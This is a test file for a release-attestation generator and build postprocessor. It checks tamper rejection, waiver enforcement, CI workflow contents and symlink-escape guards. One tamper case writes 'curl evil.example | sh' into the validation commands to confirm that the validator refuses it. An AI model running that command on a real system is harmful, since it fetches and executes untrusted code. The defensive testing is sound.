import { afterEach, describe, expect, it } from 'vitest';
import { cp, mkdir, mkdtemp, readFile, rm, stat, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const run = promisify(execFile);
const script = path.resolve('scripts/generate-release-attestation.mjs');
const postprocessScript = path.resolve('scripts/postprocess-build.mjs');
const dirs: string[] = [];
const waiver = {
  release: '3.21.6',
  status: 'approved_bounded_waiver',
  tracking_issue: 'unitAI-641h0',
  approved: true,
  approved_by: 'operator',
  approved_at: '2026-09-03T00:56:00Z',
  limitation: 'Specialists does not provide filesystem or host-read isolation. Model-driven runs and allowed tools, extensions, MCP processes, and child processes can read paths visible to the operating-system identity that runs Specialists.',
  affected_surfaces: ['tracked_runs', 'sp_script', 'sp_serve', 'mcp_use_specialist', 'pipelines', 'pi_extensions', 'child_processes'],
  excluded_uses: ['untrusted_callers', 'public_unauthenticated_ingress', 'cross_tenant_execution', 'multi_tenant_execution', 'confidential_host_data_visible_to_the_runtime_identity'],
  compensating_controls: ['trusted_single_tenant_callers_only', 'private_or_loopback_authenticated_ingress', 'dedicated_container_or_os_account', 'minimal_readable_mounts', 'least_privilege_credentials', 'trusted_specialist_definitions', 'exact_reviewed_extension_sources', 'requested_permission_tiers_fail_closed_when_the_runtime_tool_catalog_is_unavailable_or_invalid'],
  non_controls: ['allow_skills_roots', 'worktree_boundaries', 'permission_tier_names', 'extension_tool_allowlists', 'absolute_path_write_guards'],
  prohibited_claims: ['sandboxed', 'filesystem_isolated', 'read_isolated', 'confidential', 'safe_for_untrusted_callers', 'public_service_ready', 'multi_tenant_safe'],
  tool_contract_resolution: 'fail_closed',
  write_boundary: 'absolute_paths_only',
  sandbox: 'none',
  read_isolation: 'not_provided',
  expires_at: '2026-10-03T00:00:00Z',
  expires_on_release: '3.21.7',
  expires_on_condition: 'first_release_that_provides_enforced_host_read_isolation',
  expiry_rule: 'whichever_occurs_first',
  reopen_conditions: ['unauthorized_host_read', 'public_or_cross_tenant_deployment', 'requested_tier_launch_without_explicit_tools', 'readable_mount_expansion', 'misleading_isolation_documentation', 'waiver_expiry'],
  publication_authorized: false,
};

const attestationEnv = { PI_VERSION: 'not-run' };

const FIXTURE_INPUTS = [
  'package.json',
  'scripts/generate-release-attestation.mjs',
  'config/catalog/index.json',
  'config/catalog/native.json',
  'config/catalog/gitnexus.json',
  'config/mandatory-rules/index.json',
  'config/mandatory-rules/executor-delivery.md',
  'config/specialists/explorer.specialist.json',
  'config/specialists/overthinker.specialist.json',
  'config/specialists/obligations-scanner.specialist.json',
] as const;

afterEach(async () => {
  await Promise.all(dirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

async function makeFixture(opts: { version?: string } = {}) {
  const dir = await mkdtemp(path.join(tmpdir(), 'release-attestation-'));
  dirs.push(dir);
  const repo = path.join(dir, 'repo');
  const version = opts.version ?? '3.21.6';
  for (const input of FIXTURE_INPUTS) {
    const target = path.join(repo, input);
    await mkdir(path.dirname(target), { recursive: true });
    await cp(input, target);
  }
  if (opts.version) {
    const pkg = JSON.parse(await readFile(path.join(repo, 'package.json'), 'utf8'));
    pkg.version = opts.version;
    await writeFile(path.join(repo, 'package.json'), JSON.stringify(pkg, null, 2));
  }
  const git = (...args: string[]) => run('git', args, { cwd: repo });
  await git('init', '-q', '-b', 'main');
  await git('config', 'user.email', 'fixture@example.com');
  await git('config', 'user.name', 'fixture');
  await git('config', 'commit.gpgsign', 'false');
  await git('add', '-A');
  await git('commit', '-q', '-m', 'fixture');
  const tarball = path.join(dir, `jaggerxtrm-specialists-${version}.tgz`);
  const attestation = path.join(dir, 'attestation.json');
  await writeFile(tarball, 'deterministic tarball');
  return { dir, repo, tarball, attestation };
}

async function generate(repo: string, ...args: string[]) {
  try {
    const { stdout } = await run('node', [path.join(repo, 'scripts/generate-release-attestation.mjs'), ...args], {
      cwd: repo,
      env: { ...process.env, ...attestationEnv },
    });
    return { ok: true as const, error: '', stdout };
  } catch (error) {
    const e = error as { stderr?: string; stdout?: string };
    return { ok: false as const, error: `${e.stderr ?? ''}${e.stdout ?? ''}` };
  }
}

async function fixture(opts: { version?: string } = {}) {
  const fx = await makeFixture(opts);
  const result = await generate(fx.repo, fx.tarball, fx.attestation);
  if (!result.ok) throw new Error(`fixture generation failed: ${result.error}`);
  return fx;
}

async function loadGenerator() {
  return (await import(pathToFileURL(script).href)) as {
    enforceWaiver: (packageVersion: string, now?: number) => void;
  };
}

async function loadPostprocessor() {
  return (await import(pathToFileURL(postprocessScript).href)) as {
    postprocessBuild: (projectRootPath?: string) => Promise<void>;
  };
}

async function validate(repo: string, tarball: string, attestation: string, env: Record<string, string | undefined> = {}) {
  try {
    await run('node', [path.join(repo, 'scripts/generate-release-attestation.mjs'), '--validate', tarball, attestation], {
      cwd: repo,
      env: { ...process.env, ...attestationEnv, ...env },
    });
    return { ok: true, error: '' };
  } catch (error) {
    const e = error as { stderr?: string; stdout?: string };
    return { ok: false, error: `${e.stderr ?? ''}${e.stdout ?? ''}` };
  }
}

async function mutate(attestation: string, change: (value: any) => void) {
  const value = JSON.parse(await readFile(attestation, 'utf8'));
  change(value);
  await writeFile(attestation, JSON.stringify(value));
}

describe('3.21.6 release attestation', () => {
  it('generates and validates a detached, source-bound receipt with the bounded waiver', async () => {
    const { repo, tarball, attestation } = await fixture();
    const result = await validate(repo, tarball, attestation);
    const metadata = JSON.parse(await readFile(attestation, 'utf8'));
    const { stdout: headStdout } = await run('git', ['rev-parse', 'HEAD'], { cwd: repo });

    expect(result).toEqual({ ok: true, error: '' });
    expect(metadata.schema_version).toBe('1.1.0');
    expect(metadata.attestation_status).toBe('final_detached');
    expect(metadata.package).toMatchObject({
      name: '@jaggerxtrm/specialists',
      version: '3.21.6',
      source_commit: headStdout.trim(),
      git_head: headStdout.trim(),
      tarball: 'jaggerxtrm-specialists-3.21.6.tgz',
    });
    expect(metadata.package.source_commit).toMatch(/^[0-9a-f]{40}$/);
    expect(metadata.pi_runtime.version_or_range).toBe('not-run');
    expect(metadata.scope).toContain('does not certify Pi');
    expect(metadata.host_read_isolation).toEqual({ provided: false, waiver });
    expect(metadata.publication_authorized).toBe(false);
  });

  it.each([
    ['schema', (a: any) => { a.schema_version = '1.0.0'; }, 'unsupported schema'],
    ['attestation status', (a: any) => { a.attestation_status = 'candidate_template'; }, 'attestation status mismatch'],
    ['package name/version', (a: any) => { a.package.version = '3.21.5'; }, 'package name/version mismatch'],
    ['source commit', (a: any) => { a.package.source_commit = '0'.repeat(40); }, 'source commit mismatch'],
    ['git head', (a: any) => { a.package.git_head = '0'.repeat(40); }, 'source commit mismatch'],
    ['fingerprints', (a: any) => { a.fingerprints.catalog_sha256 = 'wrong'; }, 'fingerprint mismatch'],
    ['Pi identity', (a: any) => { a.pi_runtime.version_or_range = 'pi other'; }, 'Pi identity mismatch'],
    ['read isolation', (a: any) => { a.host_read_isolation.provided = true; }, 'host-read isolation waiver mismatch'],
    ['waiver surface', (a: any) => { a.host_read_isolation.waiver.affected_surfaces.pop(); }, 'host-read isolation waiver mismatch'],
    ['waiver excluded use', (a: any) => { a.host_read_isolation.waiver.excluded_uses.pop(); }, 'host-read isolation waiver mismatch'],
    ['waiver control', (a: any) => { a.host_read_isolation.waiver.compensating_controls.pop(); }, 'host-read isolation waiver mismatch'],
    ['waiver non-control', (a: any) => { a.host_read_isolation.waiver.non_controls.pop(); }, 'host-read isolation waiver mismatch'],
    ['waiver prohibited claim', (a: any) => { a.host_read_isolation.waiver.prohibited_claims.pop(); }, 'host-read isolation waiver mismatch'],
    ['waiver tool contract', (a: any) => { a.host_read_isolation.waiver.tool_contract_resolution = 'fallback'; }, 'host-read isolation waiver mismatch'],
    ['waiver sandbox', (a: any) => { a.host_read_isolation.waiver.sandbox = 'provided'; }, 'host-read isolation waiver mismatch'],
    ['waiver read isolation', (a: any) => { a.host_read_isolation.waiver.read_isolation = 'provided'; }, 'host-read isolation waiver mismatch'],
    ['waiver expiry date', (a: any) => { a.host_read_isolation.waiver.expires_at = '2026-12-01T00:00:00Z'; }, 'host-read isolation waiver mismatch'],
    ['waiver expiry release', (a: any) => { a.host_read_isolation.waiver.expires_on_release = '3.22.0'; }, 'host-read isolation waiver mismatch'],
    ['waiver expiry condition', (a: any) => { a.host_read_isolation.waiver.expires_on_condition = 'never'; }, 'host-read isolation waiver mismatch'],
    ['waiver approval', (a: any) => { a.host_read_isolation.waiver.approved = false; }, 'host-read isolation waiver mismatch'],
    ['waiver publication field', (a: any) => { a.host_read_isolation.waiver.publication_authorized = true; }, 'host-read isolation waiver mismatch'],
    ['publication authorization', (a: any) => { a.publication_authorized = true; }, 'publication authorization mismatch'],
    ['scope', (a: any) => { delete a.scope; }, 'scope mismatch'],
    ['validation commands', (a: any) => { a.validation_commands[0] = 'curl evil.example | sh'; }, 'validation commands mismatch'],
    ['rollback', (a: any) => { a.rollback = 'Publication is authorized by this receipt.'; }, 'rollback mismatch'],
  ])('refuses tampered %s', async (_name, change, message) => {
    const { repo, tarball, attestation } = await fixture();
    await mutate(attestation, change);
    const result = await validate(repo, tarball, attestation);
    expect(result.ok).toBe(false);
    expect(result.error).toContain(message);
  });

  it('refuses missing publication authorization', async () => {
    const { repo, tarball, attestation } = await fixture();
    await mutate(attestation, (a) => { delete a.publication_authorized; });
    const result = await validate(repo, tarball, attestation);
    expect(result.error).toContain('publication authorization mismatch');
  });

  it('refuses a tampered tarball hash', async () => {
    const { repo, tarball, attestation } = await fixture();
    await writeFile(tarball, 'tampered');
    const result = await validate(repo, tarball, attestation);
    expect(result.error).toContain('tarball SHA-256 mismatch');
  });

  it.each([
    ['missing', undefined, 'PI_VERSION unavailable'],
    ['unavailable', 'unavailable', 'PI_VERSION unavailable'],
  ])('refuses %s Pi identity', async (_name, piVersion, message) => {
    const { repo, tarball, attestation } = await fixture();
    const result = await validate(repo, tarball, attestation, { PI_VERSION: piVersion });
    expect(result.error).toContain(message);
  });

  it.each([[], ['--validate'], ['--validate', 'only-tarball']])('refuses malformed args: %j', async (...args) => {
    const result = await run('node', [script, ...args], {
      env: { ...process.env, ...attestationEnv },
    }).then(() => ({ ok: true })).catch((e) => ({ ok: false, error: String(e.stderr) }));
    expect(result.ok).toBe(false);
    if ('error' in result) expect(result.error).toContain('usage');
  });

  it('keeps the tracked receipt honest as a non-final candidate template', async () => {
    const metadata = JSON.parse(await readFile('release-attestation.json', 'utf8'));
    expect(metadata.schema_version).toBe('1.1.0');
    expect(metadata.attestation_status).toBe('candidate_template');
    expect(metadata.package).toMatchObject({
      name: '@jaggerxtrm/specialists',
      version: '3.21.6',
      source_commit: 'not-generated',
      git_head: 'not-generated',
      tarball: 'jaggerxtrm-specialists-3.21.6.tgz',
      sha256: 'not-generated',
    });
    expect(metadata.host_read_isolation).toEqual({ provided: false, waiver });
    expect(metadata.publication_authorized).toBe(false);
    expect(metadata.note).toContain('detached');
  });

  it('records the canonical build, pack, exclusion, and install checks', async () => {
    const metadata = JSON.parse(await readFile('release-attestation.json', 'utf8'));
    expect(metadata.validation_commands).toEqual(expect.arrayContaining([
      'bun install --frozen-lockfile',
      'NODE_ENV=test bun run build',
      'npm pack --dry-run --json',
      'npm pack --json',
      'tar -tzf <tarball> | grep -i serena (must return no matches)',
      'npm install --global --prefix="$prefix" <tarball>',
      'sp --version && sp doctor --check-drift && sp list --compact',
    ]));
  });
});

describe('generation provenance guards', () => {
  it('refuses bare generation without an explicit detached output path and writes nothing', async () => {
    const { repo, tarball } = await makeFixture();
    const result = await generate(repo, tarball);
    expect(result.ok).toBe(false);
    expect(result.error).toContain('usage');
    expect(result.error).toContain('explicit');
    await expect(stat(path.join(repo, 'release-attestation.json'))).rejects.toMatchObject({ code: 'ENOENT' });
    const { stdout } = await run('git', ['status', '--porcelain', '--untracked-files=all'], { cwd: repo });
    expect(stdout.trim()).toBe('');
  });

  it.each([
    ['a dirty tracked file', async (repo: string) => { await writeFile(path.join(repo, 'config/catalog/index.json'), '{}\n'); }],
    ['an untracked file', async (repo: string) => { await writeFile(path.join(repo, 'stray.txt'), 'stray\n'); }],
  ])('refuses generation with %s', async (_name, mutateRepo) => {
    const { repo, tarball, attestation } = await makeFixture();
    await mutateRepo(repo);
    const result = await generate(repo, tarball, attestation);
    expect(result.ok).toBe(false);
    expect(result.error).toContain('dirty or untracked');
    await expect(stat(attestation)).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('refuses generation when package.json.version drifts from the waiver release', async () => {
    const { repo, tarball, attestation } = await makeFixture({ version: '3.21.7' });
    const result = await generate(repo, tarball, attestation);
    expect(result.ok).toBe(false);
    expect(result.error).toContain('does not match waiver release 3.21.6');
    await expect(stat(attestation)).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('enforces the waiver on validation against the wall clock via the shared check', async () => {
    const { enforceWaiver } = await loadGenerator();
    expect(() => enforceWaiver('3.21.6', Date.parse('2026-10-02T23:59:59Z'))).not.toThrow();
    expect(() => enforceWaiver('3.21.6', Date.parse('2026-10-03T00:00:00Z'))).toThrow('expired at 2026-10-03T00:00:00Z');
    expect(() => enforceWaiver('3.21.7', Date.parse('2026-09-03T00:00:00Z'))).toThrow('does not match waiver release 3.21.6');
  });
});

describe('package-payload release contract', () => {
  it('builds reproducibly and validates a detached receipt before pinned upload', async () => {
    const workflow = await readFile('.github/workflows/package-payload.yml', 'utf8');
    const validation = workflow.indexOf('EXPECTED_SOURCE_COMMIT=');
    const upload = workflow.indexOf('uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02');

    expect(validation).toBeGreaterThan(-1);
    expect(upload).toBeGreaterThan(validation);
    expect(workflow).toContain('NODE_ENV=test bun run build');
    expect(workflow).toContain('git diff --exit-code -- dist/');
    expect(workflow).toContain('git status --porcelain --untracked-files=all -- dist/');
    expect(workflow).toContain("tarball_name=$(npm pack --pack-destination /tmp --json | jq -r '.[0].filename')");
    expect(workflow).toContain('tarball="/tmp/$tarball_name"');
    expect(workflow).not.toContain('cp "$tarball" /tmp/sp-test.tgz');
    expect(workflow).toContain('permissions:\n  contents: read');
    expect(workflow).not.toContain('actions: write');
    expect(workflow).toContain('path: /tmp/release-attestation.json');
    expect(workflow).toContain('if-no-files-found: error');
    expect(workflow).toContain('retention-days: 90');
    expect(workflow).toContain('overwrite: false');
  });

  it('ships dist built from an in-place dependency tree (no host walk-up module paths)', async () => {
    for (const artifact of ['dist/index.js', 'dist/lib.js']) {
      const bundle = await readFile(artifact, 'utf8');
      const leaked = bundle.match(/^\/\/ (?:\.\.\/)+\S.*$/gm) ?? [];
      expect(leaked).toEqual([]);
    }
  });

  it('ships tracked declaration files without trailing horizontal whitespace', async () => {
    const { stdout } = await run('git', ['ls-files', 'dist/types/**/*.d.ts']);
    const declarationFiles = stdout.trim().split('\n').filter(Boolean);

    expect(declarationFiles.length).toBeGreaterThan(0);
    for (const declarationFile of declarationFiles) {
      const declaration = await readFile(declarationFile, 'utf8');
      const leaked = declaration.split(/\r?\n/)
        .map((line, index) => (/[^\S\r\n]+$/.test(line) ? `${declarationFile}:${index + 1}` : null))
        .filter(Boolean);
      expect(leaked).toEqual([]);
    }
  });

  it('ships an executable bun cli and avoids GNU-only post-build rewriting', async () => {
    const pkg = JSON.parse(await readFile('package.json', 'utf8'));
    const cli = await readFile('dist/index.js', 'utf8');

    expect(pkg.scripts.build).not.toContain('sed -i');
    expect(pkg.scripts.build).toContain('node scripts/postprocess-build.mjs');
    expect(cli.startsWith('#!/usr/bin/env bun\n')).toBe(true);
    expect(((await stat('dist/index.js')).mode & 0o111)).not.toBe(0);
  });

  it('fails closed on symlinked declarations without mutating outside files', async () => {
    const { postprocessBuild } = await loadPostprocessor();
    const dir = await mkdtemp(path.join(tmpdir(), 'postprocess-build-'));
    dirs.push(dir);
    const repo = path.join(dir, 'repo');
    const distTypes = path.join(repo, 'dist', 'types');
    const outsideDir = path.join(dir, 'outside');
    const outsideFile = path.join(outsideDir, 'sentinel.d.ts');

    await mkdir(distTypes, { recursive: true });
    await mkdir(outsideDir, { recursive: true });
    await writeFile(path.join(repo, 'dist', 'index.js'), '#!/usr/bin/env node\nconsole.log(1);\n');
    await writeFile(outsideFile, 'export type Sentinel = string;  \n');
    await symlink(outsideFile, path.join(distTypes, 'escaped.d.ts'));

    const before = await readFile(outsideFile, 'utf8');
    await expect(postprocessBuild(repo)).rejects.toThrow(/symlink/);
    expect(await readFile(outsideFile, 'utf8')).toBe(before);
  });

  it('fails closed on symlinked dist root without mutating outside files', async () => {
    const { postprocessBuild } = await loadPostprocessor();
    const dir = await mkdtemp(path.join(tmpdir(), 'postprocess-build-'));
    dirs.push(dir);
    const repo = path.join(dir, 'repo');
    const outsideDir = path.join(dir, 'outside-dist');
    const outsideSentinel = path.join(outsideDir, 'sentinel.txt');
    const outsideIndex = path.join(outsideDir, 'index.js');

    await mkdir(repo, { recursive: true });
    await mkdir(outsideDir, { recursive: true });
    await writeFile(outsideSentinel, 'sentinel');
    await writeFile(outsideIndex, '#!/usr/bin/env node\nconsole.log("outside");\n');
    await symlink(outsideDir, path.join(repo, 'dist'));

    const beforeSentinel = await readFile(outsideSentinel, 'utf8');
    const beforeIndex = await readFile(outsideIndex, 'utf8');
    await expect(postprocessBuild(repo)).rejects.toThrow(/symlink/);
    expect(await readFile(outsideSentinel, 'utf8')).toBe(beforeSentinel);
    expect(await readFile(outsideIndex, 'utf8')).toBe(beforeIndex);
  });

  it('fails closed on symlinked dist/types root without mutating outside files and without partially rewriting the cli', async () => {
    const { postprocessBuild } = await loadPostprocessor();
    const dir = await mkdtemp(path.join(tmpdir(), 'postprocess-build-'));
    dirs.push(dir);
    const repo = path.join(dir, 'repo');
    const distPath = path.join(repo, 'dist');
    const outsideTypes = path.join(dir, 'outside-types');
    const outsideSentinel = path.join(outsideTypes, 'sentinel.d.ts');

    await mkdir(distPath, { recursive: true });
    await mkdir(outsideTypes, { recursive: true });
    await writeFile(path.join(distPath, 'index.js'), '#!/usr/bin/env node\nconsole.log(1);\n');
    await writeFile(outsideSentinel, 'export type Sentinel = string;  \n');
    await symlink(outsideTypes, path.join(distPath, 'types'));

    const beforeSentinel = await readFile(outsideSentinel, 'utf8');
    const beforeIndex = await readFile(path.join(distPath, 'index.js'), 'utf8');
    await expect(postprocessBuild(repo)).rejects.toThrow(/symlink/);
    expect(await readFile(outsideSentinel, 'utf8')).toBe(beforeSentinel);
    expect(await readFile(path.join(distPath, 'index.js'), 'utf8')).toBe(beforeIndex);
  });

  it('runs for release-facing changes and asserts required and forbidden payload assets', async () => {
    const workflow = await readFile('.github/workflows/package-payload.yml', 'utf8');
    for (const pathTrigger of ['README.md', 'CHANGELOG.md', 'release-attestation.json', 'tests/integration/release-attestation.test.ts', 'scripts/postprocess-build.mjs']) {
      expect(workflow).toContain(`- ${pathTrigger}`);
    }
    for (const asset of [
      'README.md',
      'CHANGELOG.md',
      'config/catalog/index.json',
      'config/catalog/native.json',
      'config/catalog/gitnexus.json',
      'config/specialists/service-knowledge-sync.specialist.json',
      'config/pi-extensions/extension-tool-policy/index.mjs',
      'config/pi-extensions/read-line-numbers/index.mjs',
      'config/pi-extensions/read-line-numbers/package.json',
      'scripts/generate-release-attestation.mjs',
      'dist/index.js',
      'dist/lib.js',
    ]) {
      expect(workflow).toContain(asset);
    }
    expect(workflow).toContain("select(.path == \"release-attestation.json\")");
  });
});
